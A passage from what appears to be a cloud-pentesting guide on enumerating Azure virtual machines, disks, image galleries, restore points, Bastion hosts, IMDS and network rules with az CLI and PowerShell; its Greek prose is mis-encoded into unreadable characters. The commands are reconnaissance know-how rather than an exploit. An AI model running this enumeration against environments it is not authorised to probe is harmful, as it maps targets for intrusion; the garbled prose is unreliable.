az disk show --name <disk-name> --resource-group <rsc-group>
```
{% endcode %}
{% endtab %}
{% tab title="PowerShell" %}
{% code overflow="wrap" %}
```powershell
# List all disks
Get-AzDisk

# Get info about a disk
Get-AzDisk -Name <DiskName> -ResourceGroupName <ResourceGroupName>
```
{% endcode %}
{% endtab %}
{% endtabs %}


## Î•Î¹ÎºÏŒÎ½ÎµÏ‚, Î•Î¹ÎºÏŒÎ½ÎµÏ‚ Î“ÎºÎ±Î»ÎµÏÎ¯ & Î£Î·Î¼ÎµÎ¯Î± Î•Ï€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚

ÎœÎ¹Î± **ÎµÎ¹ÎºÏŒÎ½Î± VM** ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Ï€ÏÏŒÏ„Ï…Ï€Î¿ Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î¿ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒ ÏƒÏÏƒÏ„Î·Î¼Î±, Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ ÎºÎ±Î¹ Ï„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Î±ÏÏ‡ÎµÎ¯Ï‰Î½ Ï€Î¿Ï… Î±Ï€Î±Î¹Ï„Î¿ÏÎ½Ï„Î±Î¹ Î³Î¹Î± **Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Î¼Î¹Î±Ï‚ Î½Î­Î±Ï‚ ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÎ®Ï‚ Î¼Î·Ï‡Î±Î½Î®Ï‚ (VM)**. Î— Î´Î¹Î±Ï†Î¿ÏÎ¬ Î¼ÎµÏ„Î±Î¾Ï Î¼Î¹Î±Ï‚ ÎµÎ¹ÎºÏŒÎ½Î±Ï‚ ÎºÎ±Î¹ ÎµÎ½ÏŒÏ‚ ÏƒÏ„Î¹Î³Î¼Î¹ÏŒÏ„Ï…Ï€Î¿Ï… Î´Î¯ÏƒÎºÎ¿Ï… ÎµÎ¯Î½Î±Î¹ ÏŒÏ„Î¹ Î­Î½Î± ÏƒÏ„Î¹Î³Î¼Î¹ÏŒÏ„Ï…Ï€Î¿ Î´Î¯ÏƒÎºÎ¿Ï… ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Î¼ÏŒÎ½Î¿ Î±Î½Î±Î³Î½ÏÏƒÎ¹Î¼Î·, Ï‡ÏÎ¿Î½Î¹ÎºÎ¬ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î· Î±Î½Ï„Î¹Î³ÏÎ±Ï†Î® ÎµÎ½ÏŒÏ‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½Î¿Ï… Î´Î¯ÏƒÎºÎ¿Ï…, Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÎºÏ…ÏÎ¯Ï‰Ï‚ Î³Î¹Î± Î±Î½Ï„Î¯Î³ÏÎ±Ï†Î± Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Î® Î±Ï€Î¿ÏƒÏ†Î±Î»Î¼Î¬Ï„Ï‰ÏƒÎ·, ÎµÎ½Ï Î¼Î¹Î± ÎµÎ¹ÎºÏŒÎ½Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ **Ï€Î¿Î»Î»Î¿ÏÏ‚ Î´Î¯ÏƒÎºÎ¿Ï…Ï‚ ÎºÎ±Î¹ Î­Ï‡ÎµÎ¹ ÏƒÏ‡ÎµÎ´Î¹Î±ÏƒÏ„ÎµÎ¯ Î³Î¹Î± Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼ÎµÏÎµÎ¹ Ï‰Ï‚ Ï€ÏÏŒÏ„Ï…Ï€Î¿ Î³Î¹Î± Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Î½Î­Ï‰Î½ VMs**.\
ÎŸÎ¹ ÎµÎ¹ÎºÏŒÎ½ÎµÏ‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ ÏƒÏ„Î·Î½ **ÎµÎ½ÏŒÏ„Î·Ï„Î± Î•Î¹ÎºÏŒÎ½ÎµÏ‚** Ï„Î¿Ï… Azure Î® Î¼Î­ÏƒÎ± ÏƒÎµ **Î³ÎºÎ±Î»ÎµÏÎ¯ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„ÏÎ½ Azure**, Î¿Î¹ Î¿Ï€Î¿Î¯ÎµÏ‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± **ÎµÎºÎ´ÏŒÏƒÎµÏ‰Î½** ÎºÎ±Î¹ **ÎºÎ¿Î¹Î½Î¿Ï€Î¿Î¯Î·ÏƒÎ·** Ï„Î·Ï‚ ÎµÎ¹ÎºÏŒÎ½Î±Ï‚ Î´Î¹Î±ÏƒÏ…Î½Î¿ÏÎ¹Î±ÎºÎ¬ Î® Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Ï„Î·Î½ Î´Î·Î¼Î¿ÏƒÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ® Ï„Î·Ï‚.

ÎˆÎ½Î± **ÏƒÎ·Î¼ÎµÎ¯Î¿ ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚** Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÎ¹ Ï„Î· Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Ï„Î¿Ï… VM ÎºÎ±Î¹ **Ï‡ÏÎ¿Î½Î¹ÎºÎ¬ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î±** ÏƒÏ„Î¹Î³Î¼Î¹ÏŒÏ„Ï…Ï€Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚-ÏƒÏ…Î½ÎµÏ€Î¿ÏÏ‚ **ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½Ï‰Î½ Î´Î¯ÏƒÎºÏ‰Î½** Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿Î¹ Î¼Îµ Ï„Î¿ VM. Î£Ï‡ÎµÏ„Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Ï„Î¿ VM ÎºÎ±Î¹ Î¿ ÏƒÎºÎ¿Ï€ÏŒÏ‚ Ï„Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î½Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î±Î½Î±Ï†Î­ÏÎµÎ¹ Ï„Î¿ VM ÏƒÎµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î· ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï„Î¿Ï…. 

{% tabs %}
{% tab title="az cli" %}
{% code overflow="wrap" %}
```bash
# Shared Image Galleries | Compute Galleries
## List all galleries and get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all community galleries
az sig list-community --output table

## List galleries shaerd with me
az sig list-shared --location <location> --output table

## List all image definitions in a gallery and get info about one
az sig image-definition list --gallery-name <name> --resource-group <rsc-group> --output table
az sig image-definition show --gallery-image-definition <name> --gallery-name <gallery-name> --resource-group <rsc-group>

## List all the versions of an image definition in a gallery
az sig image-version list --gallery-image-name <image-name> --gallery-name <gallery-name> --resource-group <rsc-group --output table

## List all VM applications inside a gallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table

# Images
# List all managed images in your subscription
az image list --output table

# Restore points
## List all restore points and get info about 1
az restore-point collection list-all --output table
az restore-point collection show --collection-name <collection-name> --resource-group <rsc-group>
```
{% endcode %}
{% endtab %}
{% tab title="PowerShell" %}
{% code overflow="wrap" %}
```powershell
## List all galleries and get info about one
Get-AzGallery
Get-AzGallery -Name <GalleryName> -ResourceGroupName <ResourceGroupName>

## List all image definitions in a gallery and get info about one
Get-AzGalleryImageDefinition -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>
Get-AzGalleryImageDefinition -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName> -Name <ImageDefinitionName>

## List all the versions of an image definition in a gallery
Get-AzGalleryImageVersion -GalleryImageDefinitionName <ImageName> -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>

## List all VM applications inside a gallery
Get-AzGalleryApplication -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>

# Images
# List all managed images in your subscription
Get-AzImage -Name <ResourceName> -ResourceGroupName <ResourceGroupName>

# Restore points
## List all restore points and get info about 1
Get-AzRestorePointCollection -Name <CollectionName> -ResourceGroupName <ResourceGroupName>
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Azure Site Recovery

Î‘Ï€ÏŒ Ï„Î± [**docs**](https://learn.microsoft.com/en-us/azure/site-recovery/site-recovery-overview): Î¤Î¿ Site Recovery Î²Î¿Î·Î¸Î¬ ÏƒÏ„Î·Î½ ÎµÎ¾Î±ÏƒÏ†Î¬Î»Î¹ÏƒÎ· Ï„Î·Ï‚ ÎµÏ€Î¹Ï‡ÎµÎ¹ÏÎ·Î¼Î±Ï„Î¹ÎºÎ®Ï‚ ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±Ï‚ Î´Î¹Î±Ï„Î·ÏÏÎ½Ï„Î±Ï‚ Ï„Î¹Ï‚ ÎµÏ€Î¹Ï‡ÎµÎ¹ÏÎ·Î¼Î±Ï„Î¹ÎºÎ­Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ ÎºÎ±Î¹ Ï„Î± Ï†Î¿ÏÏ„Î¯Î± ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚ ÏƒÎµ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± Î´Î¹Î±ÎºÎ¿Ï€ÏÎ½. Î¤Î¿ Site Recovery **Î±Î½Ï„Î¹Î³ÏÎ¬Ï†ÎµÎ¹ Ï„Î± Ï†Î¿ÏÏ„Î¯Î± ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚** Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ ÏƒÎµ Ï†Ï…ÏƒÎ¹ÎºÎ­Ï‚ ÎºÎ±Î¹ ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÎ­Ï‚ Î¼Î·Ï‡Î±Î½Î­Ï‚ (VMs) Î±Ï€ÏŒ Î¼Î¹Î± ÎºÏÏÎ¹Î± Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î± ÏƒÎµ Î¼Î¹Î± Î´ÎµÏ…Ï„ÎµÏÎµÏÎ¿Ï…ÏƒÎ± Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î±. ÎŒÏ„Î±Î½ ÏƒÏ…Î¼Î²ÎµÎ¯ Î¼Î¹Î± Î´Î¹Î±ÎºÎ¿Ï€Î® ÏƒÏ„Î·Î½ ÎºÏÏÎ¹Î± Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î± ÏƒÎ±Ï‚, Î¼ÎµÏ„Î±Î²Î±Î¯Î½ÎµÏ„Îµ ÏƒÎµ Î¼Î¹Î± Î´ÎµÏ…Ï„ÎµÏÎµÏÎ¿Ï…ÏƒÎ± Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î± ÎºÎ±Î¹ Î±Ï€Î¿ÎºÏ„Î¬Ï„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¹Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ Î±Ï€ÏŒ ÎµÎºÎµÎ¯. Î‘Ï†Î¿Ï Î· ÎºÏÏÎ¹Î± Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î¾Î±Î½Î¬, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÏ„Îµ ÏƒÎµ Î±Ï…Ï„Î®Î½.

## Azure Bastion

Î¤Î¿ Azure Bastion ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î±ÏƒÏ†Î±Î»Î® ÎºÎ±Î¹ Î±Ï€ÏÏŒÏƒÎºÎ¿Ï€Ï„Î· **Remote Desktop Protocol (RDP)** ÎºÎ±Î¹ **Secure Shell (SSH)** Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¹Ï‚ ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÎ­Ï‚ Î¼Î·Ï‡Î±Î½Î­Ï‚ (VMs) ÏƒÎ±Ï‚ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… Azure Portal Î® Î¼Î­ÏƒÏ‰ ÎµÎ½ÏŒÏ‚ jump box. ÎœÎµ Ï„Î·Î½ **ÎµÎ¾Î¬Î»ÎµÎ¹ÏˆÎ· Ï„Î·Ï‚ Î±Î½Î¬Î³ÎºÎ·Ï‚ Î³Î¹Î± Î´Î·Î¼ÏŒÏƒÎ¹ÎµÏ‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ IP** ÏƒÏ„Î¹Ï‚ VMs ÏƒÎ±Ï‚.&#x20;

Î¤Î¿ Bastion Î±Î½Î±Ï€Ï„ÏÏƒÏƒÎµÎ¹ Î­Î½Î± Ï…Ï€Î¿Î´Î¯ÎºÏ„Ï…Î¿ Ï€Î¿Ï… Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ **`AzureBastionSubnet`** Î¼Îµ Î¼Î¬ÏƒÎºÎ± Î´Î¹ÎºÏ„ÏÎ¿Ï… `/26` ÏƒÏ„Î¿ VNet Ï€Î¿Ï… Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î³Î¹Î± Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± **ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ ÏƒÎµ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ­Ï‚ VMs Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î¿Ï‚ Ï€ÎµÏÎ¹Î®Î³Î·ÏƒÎ·Ï‚** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ `RDP` ÎºÎ±Î¹ `SSH`, Î±Ï€Î¿Ï†ÎµÏÎ³Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Î­ÎºÎ¸ÎµÏƒÎ· Î¸Ï…ÏÏÎ½ Ï„Ï‰Î½ VMs ÏƒÏ„Î¿ Î”Î¹Î±Î´Î¯ÎºÏ„Ï…Î¿. ÎœÏ€Î¿ÏÎµÎ¯ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Ï‰Ï‚ **jump host**.

Î“Î¹Î± Î½Î± ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÏ„Îµ ÏŒÎ»Î¿Ï…Ï‚ Ï„Î¿Ï…Ï‚ Azure Bastion Hosts ÏƒÏ„Î·Î½ Ï…Ï€Î¿Î³ÏÎ±Ï†Î® ÏƒÎ±Ï‚ ÎºÎ±Î¹ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ ÏƒÎµ VMs Î¼Î­ÏƒÏ‰ Î±Ï…Ï„ÏÎ½, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¹Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ½Ï„Î¿Î»Î­Ï‚:

{% tabs %}
{% tab title="az cli" %}
{% code overflow="wrap" %}
```bash
# List bastions
az network bastion list -o table

# Connect via SSH through bastion
az network bastion ssh \
--name MyBastion \
--resource-group MyResourceGroup \
--target-resource-id /subscriptions/12345678-1234-1234-1234-123456789abc/resourceGroups/MyResourceGroup/providers/Microsoft.Compute/virtualMachines/MyVM \
--auth-type ssh-key \
--username azureuser \
--ssh-key ~/.ssh/id_rsa

# Connect via RDP through bastion
az network bastion rdp \
--name <BASTION_NAME> \
--resource-group <RESOURCE_GROUP> \
--target-resource-id /subscriptions/<SUBSCRIPTION_ID>/resourceGroups/<RESOURCE_GROUP>/providers/Microsoft.Compute/virtualMachines/<VM_NAME> \
--auth-type password \
--username <VM_USERNAME> \
--password <VM_PASSWORD>
```
{% endcode %}
{% endtab %}
{% tab title="PowerShell" %}
{% code overflow="wrap" %}
```powershell
# List bastions
Get-AzBastion
```
{% endcode %}
{% endtab %}
{% endtabs %}

## ÎœÎµÏ„Î±Î´ÎµÎ´Î¿Î¼Î­Î½Î±

Î— Î¥Ï€Î·ÏÎµÏƒÎ¯Î± ÎœÎµÏ„Î±Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î£Ï„Î¹Î³Î¼Î¹ÏŒÏ„Ï…Ï€Î¿Ï… Azure (IMDS) **Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¹Ï‚ ÎµÎºÏ„ÎµÎ»Î¿ÏÎ¼ÎµÎ½ÎµÏ‚ ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÎ­Ï‚ Î¼Î·Ï‡Î±Î½Î­Ï‚** Î³Î¹Î± Î½Î± Î²Î¿Î·Î¸Î®ÏƒÎµÎ¹ ÏƒÏ„Î· Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· ÎºÎ±Î¹ Ï„Î· Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ® Ï„Î¿Ï…Ï‚. Î ÏÎ¿ÏƒÏ†Î­ÏÎµÎ¹ Î»ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ ÏŒÏ€Ï‰Ï‚ Ï„Î¿ SKU, Î±Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ·, ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Î´Î¹ÎºÏ„ÏÎ¿Ï… ÎºÎ±Î¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÎ¼Î­Î½Î± Î³ÎµÎ³Î¿Î½ÏŒÏ„Î± ÏƒÏ…Î½Ï„Î®ÏÎ·ÏƒÎ·Ï‚ Î¼Î­ÏƒÏ‰ **REST API Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î¿Ï… ÏƒÏ„Î· Î¼Î· Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î®ÏƒÎ¹Î¼Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP 169.254.169.254**, Î· Î¿Ï€Î¿Î¯Î± ÎµÎ¯Î½Î±Î¹ Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î· Î¼ÏŒÎ½Î¿ Î±Ï€ÏŒ Ï„Î¿ VM. Î— ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± Î¼ÎµÏ„Î±Î¾Ï Ï„Î¿Ï… VM ÎºÎ±Î¹ Ï„Î¿Ï… IMDS Ï€Î±ÏÎ±Î¼Î­Î½ÎµÎ¹ ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… ÎºÎµÎ½Ï„ÏÎ¹ÎºÎ¿Ï Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î®, Î´Î¹Î±ÏƒÏ†Î±Î»Î¯Î¶Î¿Î½Ï„Î±Ï‚ Î±ÏƒÏ†Î±Î»Î® Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·. ÎšÎ±Ï„Î¬ Ï„Î·Î½ ÎµÏÏÏ„Î·ÏƒÎ· ÏƒÏ„Î¿ IMDS, Î¿Î¹ HTTP Ï€ÎµÎ»Î¬Ï„ÎµÏ‚ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ VM Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„Î¿Ï…Î½ Ï„Î¿Ï…Ï‚ Î´Î¹Î±Î´Î¹ÎºÏ„Ï…Î±ÎºÎ¿ÏÏ‚ Î¼ÎµÏƒÎ¿Î»Î±Î²Î·Ï„Î­Ï‚ Î³Î¹Î± Î½Î± Î´Î¹Î±ÏƒÏ†Î±Î»Î¯ÏƒÎ¿Ï…Î½ ÏƒÏ‰ÏƒÏ„Î® ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î±.

Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î³Î¹Î± Î½Î± ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î®ÏƒÎµÏ„Îµ Î¼Îµ Ï„Î¿ ÏƒÎ·Î¼ÎµÎ¯Î¿ Ï„ÎµÏÎ¼Î±Ï„Î¹ÏƒÎ¼Î¿Ï Î¼ÎµÏ„Î±Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, Ï„Î¿ HTTP Î±Î¯Ï„Î·Î¼Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î­Ï‡ÎµÎ¹ Ï„Î·Î½ ÎºÎµÏ†Î±Î»Î¯Î´Î± **`Metadata: true`** ÎºÎ±Î¹ Î´ÎµÎ½ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î­Ï‡ÎµÎ¹ Ï„Î·Î½ ÎºÎµÏ†Î±Î»Î¯Î´Î± **`X-Forwarded-For`**.

Î”ÎµÎ¯Ï„Îµ Ï€ÏÏ‚ Î½Î± Ï„Î¿ Î±Ï€Î±ÏÎ¹Î¸Î¼Î®ÏƒÎµÏ„Îµ ÏƒÏ„Î¿:

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#azure-vm" %}

## Î‘Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ· VM

{% tabs %}
{% tab title="Az Cli" %}
{% code overflow="wrap" %}
```bash
# VMs
## List all VMs and get info about one
az vm list --output table
az vm show --name <came> --resource-group <rsc-group>

## List all available VM images and get info about one
az vm image list --all --output table

# VM Extensions
## List all VM extensions
az vm extension image list --output table

## Get extensions by publisher
az vm extension image list --publisher "Site24x7" --output table

## List extensions in a VM
az vm extension list -g <rsc-group> --vm-name <vm-name>

## List managed identities in a VM
az vm identity show \
--resource-group <rsc-group> \
--name <vm-name>

# Disks
## List all disks and get info about one
az disk list --output table
az disk show --name <disk-name> --resource-group <rsc-group>

# Snapshots
## List all galleries abd get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all snapshots and get info about one
az snapshot list --output table
az snapshot show --name <name> --resource-group <rsc-group>

# Shared Image Galleries | Compute Galleries
## List all galleries and get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all community galleries
az sig list-community --output table

## List galleries shared with me
az sig list-shared --location <location> --output table

## List all image definitions in a gallery and get info about one
az sig image-definition list --gallery-name <name> --resource-group <rsc-group> --output table
az sig image-definition show --gallery-image-definition <name> --gallery-name <gallery-name> --resource-group <rsc-group>

## List all the versions of an image definition in a gallery
az sig image-version list --gallery-image-name <image-name> --gallery-name <gallery-name> --resource-group <rsc-group --output table

## List all VM applications inside a gallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table

# Images
# List all managed images in your subscription
az image list --output table

# Restore points
## List all restore points and get info about 1
az restore-point collection list-all --output table
az restore-point collection show --collection-name <collection-name> --resource-group <rsc-group>

# Bastion
## list all bastions
az network bastion list -o table

# Network
## List VNets
az network vnet list --query "[].{name:name, location:location, addressSpace:addressSpace}"

## List subnets of a VNet
az network vnet subnet list --resource-group <ResourceGroupName> --vnet-name <VNetName> --query "[].{name:name, addressPrefix:addressPrefix}" -o table

## List public IPs
az network public-ip list --output table

## Get NSG rules
az network nsg rule list --nsg-name <NSGName> --resource-group <ResourceGroupName> --query "[].{name:name, priority:priority, direction:direction, access:access, protocol:protocol, sourceAddressPrefix:sourceAddressPrefix, destinationAddressPrefix:destinationAddressPrefix, sourcePortRange:sourcePortRange, destinationPortRange:destinationPortRange}" -o table

## Get NICs and subnets using this NSG
az network nsg show --name MyLowCostVM-nsg --resource-group Resource_Group_1 --query "{subnets: subnets, networkInterfaces: networkInterfaces}"

## List all Nics & get info of a single one
az network nic list --output table
az network nic show --name <name> --resource-group <rsc-group>

## List Azure Firewalls
az network firewall list --query "[].{name:name, location:location, subnet:subnet, publicIp:publicIp}" -o table

## Get network rules of a firewall
az network firewall network-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## Get application rules of a firewall
az network firewall application-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## Get nat rules of a firewall
az network firewall nat-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## List Route Tables
az network route-table list --query "[].{name:name, resourceGroup:resourceGroup, location:location}" -o table

## List routes for a table
az network route-table route list --route-table-name <RouteTableName> --resource-group <ResourceGroupName> --query "[].{name:name, addressPrefix:addressPrefix, nextHopType:nextHopType, nextHopIpAddress:nextHopIpAddress}" -o table

# Misc
## List all virtual machine scale sets
az vmss list --output table

## List all availability sets
az vm availability-set list --output table

## List all load balancers
az network lb list --output table

## List all storage accounts
az storage account list --output table

## List all custom script extensions on a specific VM
az vm extension list --vm-name <vm-name> --resource-group <resource-group>

# Show boot diagnostics settings for a specific VM
az vm boot-diagnostics get-boot-log --name <vm-name> --resource-group <resource-group>

## List all tags on virtual machines
az resource list --resource-type "Microsoft.Compute/virtualMachines" --query "[].{Name:name, Tags:tags}" --output table

# List all available run commands for virtual machines
az vm run-command list --output table
```
{% endcode %}
{% endtab %}
{% tab title="Az PS" %}
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)

# Disks
## List all disks and get info about one
Get-AzDisk
Get-AzDisk -Name <DiskName> -ResourceGroupName <ResourceGroupName>

# Snapshots
## List all galleries abd get info about one
Get-AzGallery
Get-AzGallery -Name <GalleryName> -ResourceGroupName <ResourceGroupName>

## List all snapshots and get info about one
Get-AzSnapshot
Get-AzSnapshot -Name <SnapshotName> -ResourceGroupName <ResourceGroupName>

## List all image definitions in a gallery and get info about one
Get-AzGalleryImageDefinition -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>
Get-AzGalleryImageDefinition -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName> -Name <ImageDefinitionName>

## List all the versions of an image definition in a gallery
Get-AzGalleryImageVersion -GalleryImageDefinitionName <ImageName> -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>

## List all VM applications inside a gallery
Get-AzGalleryApplication -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>

# Images
# List all managed images in your subscription
Get-AzImage -Name <ResourceName> -ResourceGroupName <ResourceGroupName>

# Restore points
## List all restore points and get info about 1
